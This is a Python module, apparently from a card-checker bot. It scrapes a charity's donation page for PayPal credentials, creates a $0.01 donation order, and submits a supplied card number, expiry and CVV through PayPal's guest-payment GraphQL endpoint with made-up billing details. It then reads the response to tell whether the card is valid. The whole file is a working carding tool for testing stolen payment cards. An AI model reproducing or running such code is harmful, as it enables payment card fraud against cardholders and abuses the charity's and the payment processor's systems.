from all.configs._def_main_ import *


async def misakifunc(cc, mes, ano, cvv):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as sess:
        headers = {
            'authority': 'bachauer.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'referer': 'https://bachauer.com/donate/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0 (Edition std-1)',
        }
        async with sess.get('https://bachauer.com/donate/', headers=headers) as resp:
            req1 = await resp.text()
            _link = parseX(
                req1, "paypal_script = 'https:\/\/www.paypal.com\/sdk\/js?client-id=", "&")
            id = "0a9b06989111b"
            _curren = parseX(req1, '"currency":"', '"')
            print("REQ 1 COMPLETE")
        headers = {
            'authority': 'www.paypal.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'referer': 'https://bachauer.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36',
        }
        params = {
            'style.label': 'paypal',
            'style.layout': 'vertical',
            'style.color': 'gold',
            'style.shape': 'rect',
            'style.tagline': 'false',
            'style.menuPlacement': 'below',
            'commit': 'true',
            'sdkVersion': '5.0.395',
            'components.0': 'buttons',
            'locale.country': 'ES',
            'locale.lang': 'es',
            'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVZ6Sy04OEx0RHpkOEpYM3VmekJURUUwVFk4Z0F2NDZxZDFrS3dqMGlxZnhINUVYeHdLcVBiNGVTZkQ3OXVDMVM3T2lmRjdfRmVVUWt2Um4mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS11aWQiOiJ1aWRfZ21yZnFrcmRqcnJibnJ5aXNlamxqZnJkY2NscHpmIn19',
            'clientID': f'{_link}',
            'sdkCorrelationID': f'{id}',
            'storageID': 'uid_310acf979b_mdm6mjq6ndm',
            'sessionID': 'uid_88168f2371_mdm6mjq6ndm',
            'buttonSessionID': 'uid_326b15c8ee_mdm6mjg6mzu',
            'env': 'production',
            'fundingEligibility': 'eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6dHJ1ZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmFyaWFudCI6bnVsbH19fSwiY2FyZCI6eyJlbGlnaWJsZSI6dHJ1ZSwiYnJhbmRlZCI6dHJ1ZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0',
            'platform': 'desktop',
            'experiment.enableVenmo': 'false',
            'experiment.enableVenmoAppLabel': 'false',
            'flow': 'purchase',
            'currency': f'{_curren}',
            'intent': 'capture',
            'vault': 'false',
            'renderedButtons.0': 'paypal',
            'renderedButtons.1': 'paylater',
            'renderedButtons.2': 'card',
            'debug': 'false',
            'applePaySupport': 'false',
            'supportsPopups': 'true',
            'supportedNativeBrowser': 'false',
            'allowBillingPayments': 'true',
            'disableSetCookie': 'true',
            'experimentation.experience': '107634',
            'experimentation.treatment': '137602',
        }
        async with sess.post('https://www.paypal.com/smart/buttons', params=params, headers=headers) as resp:
            req2 = await resp.text()
            tok = parseX(req2, '"facilitatorAccessToken":"', '"')
            print("REQ 2 COMPLETE")
        headers = {
            'authority': 'www.paypal.com',
            'accept': 'application/json',
            'authorization': f'Bearer {tok}',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'prefer': 'return=representation',
            'referer': f'https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&commit=true&sdkVersion=5.0.395&components.0=buttons&locale.country=ES&locale.lang=es&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVZ6Sy04OEx0RHpkOEpYM3VmekJURUUwVFk4Z0F2NDZxZDFrS3dqMGlxZnhINUVYeHdLcVBiNGVTZkQ3OXVDMVM3T2lmRjdfRmVVUWt2Um4mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS11aWQiOiJ1aWRfZ21yZnFrcmRqcnJibnJ5aXNlamxqZnJkY2NscHpmIn19&clientID={_link}&sdkCorrelationID={id}&storageID=uid_310acf979b_mdm6mjq6ndm&sessionID=uid_c6b97b20e4_mdm6ntc6mju&buttonSessionID=uid_2176f18320_mdm6ntc6mzu&env=production&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6dHJ1ZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmFyaWFudCI6bnVsbH19fSwiY2FyZCI6eyJlbGlnaWJsZSI6dHJ1ZSwiYnJhbmRlZCI6dHJ1ZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&vault=false&renderedButtons.0=paypal&renderedButtons.1=paylater&renderedButtons.2=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&allowBillingPayments=true&disableSetCookie=true&experimentation.experience=107634&experimentation.treatment=137602',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36',
        }
        json_data = {
            'intent': 'CAPTURE',
            'purchase_units': [
                {
                    'amount': {
                        'value': 0.01,
                        'currency_code': f'{_curren}',
                        'breakdown': {},
                    },
                    'description': 'Donation to Gina Bachauer Foundation of $0.01',
                    'payer': {
                        'name': {
                            'given_name': 'stxr',
                            'surname': 'apis',
                        },
                        'email_address': 'apixxstart@gmail.com',
                    },
                    'shipping': {},
                },
            ],
            'application_context': {},
        }

        async with sess.post('https://www.paypal.com/v2/checkout/orders', headers=headers, json=json_data) as resp:
            req3 = await resp.json()
            idtok = req3['id']
            print("REQ 3 COMPLETE")
        headers = {
            'authority': 'www.paypal.com',
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'paypal-client-context': f'{idtok}',
            'paypal-client-metadata-id': f'{idtok}',
            'referer': f'https://www.paypal.com/smart/card-fields?sessionID=uid_88168f2371_mdm6mjq6ndm&buttonSessionID=uid_326b15c8ee_mdm6mjg6mzu&locale.x=es_ES&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVZ6Sy04OEx0RHpkOEpYM3VmekJURUUwVFk4Z0F2NDZxZDFrS3dqMGlxZnhINUVYeHdLcVBiNGVTZkQ3OXVDMVM3T2lmRjdfRmVVUWt2Um4mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS11aWQiOiJ1aWRfZ21yZnFrcmRqcnJibnJ5aXNlamxqZnJkY2NscHpmIn19&disable-card=&token={idtok}',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36',
            'x-app-name': 'standardcardfields',
            'x-country': 'ES',
        }
        json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': f'{idtok}',
                'card': {
                    'cardNumber': f'{cc}',
                    'expirationDate': f'{mes}/{ano}',
                    'postalCode': '42158',
                    'securityCode': f'{cvv}',
                },
                'phoneNumber': '688612419',
                'firstName': 'start',
                'lastName': 'apis',
                'billingAddress': {
                    'givenName': 'start',
                    'familyName': 'apis',
                    'line1': 'Ourense 38',
                    'line2': None,
                    'city': 'Duruelo De La Sierra',
                    'state': 'SORIA',
                    'postalCode': '42158',
                    'country': 'ES',
                },
                'shippingAddress': {
                    'givenName': 'start',
                    'familyName': 'apis',
                    'line1': 'Ourense 38',
                    'line2': None,
                    'city': 'Duruelo De La Sierra',
                    'state': 'SORIA',
                    'postalCode': '42158',
                    'country': 'ES',
                },
                'email': 'sxtrapisss@gmail.com',
                'currencyConversionType': 'PAYPAL',
            },
            'operationName': None,
        }
        async with sess.post('https://www.paypal.com/graphql?fetch_credit_form_submit', headers=headers, json=json_data) as resp:
            req4 = await resp.json()
            print(req4)
            try:
                code = req4['errors'][0]['data'][0]['code']
            except KeyError:
                code = req4['data']['approveGuestPaymentWithCreditCard']['flags']['is3DSecureRequired']
            return code
